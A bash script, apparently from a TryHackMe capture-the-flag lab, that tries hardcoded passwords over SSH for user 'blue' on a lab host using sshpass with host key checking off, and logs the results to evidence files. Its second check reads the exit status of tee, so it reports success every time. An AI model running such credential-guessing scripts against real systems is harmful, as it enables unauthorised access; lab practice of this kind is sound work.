#!/usr/bin/env bash
# Enhanced password finder with rate limiting and better logging
cd /media/gabi/Data/CTF/THM/red

# Use the password discovered earlier from evidence
declared_passwords=(
    "sup3r_p@s$w0rd!23"
    "sup3r_p@s$w0rd!"
    
)
# Try known passwords first (from evidence)
for pwd in "${declared_passwords[@]}"; do
    echo "Testing password: $pwd"
    result=$(sshpass -p "$pwd" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 -o NumberOfPasswordPrompts=1 blue@10.67.174.191 'echo SSH_SUCCESS' 2>&1)
    if echo "$result" | grep -q "SSH_SUCCESS"; then
        echo "FOUND blue pw: $pwd" | tee -a evidence/20240701/found_credentials.txt
        exit 0
    else
        echo "Password failed: $pwd" | tee -a evidence/20240701/failed_attempts.txt
    fi
    sleep 2  # Delay between attempts
    
    # Test if we can even connect first
    echo "Testing connection with known password: $pwd"
    echo "$pwd" | sshpass -f - ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 blue@10.67.174.191 "whoami" 2>&1 | tee -a evidence/20240701/connection_test.txt
    
    if [[ $? -eq 0 ]]; then
        echo "SUCCESS: Connection established with password: $pwd" | tee -a evidence/20240701/success_connections.txt
        break
    fi
    sleep 5
done

echo "Script execution completed - manual intervention likely needed" | tee -a evidence/20240701/script_completion.txt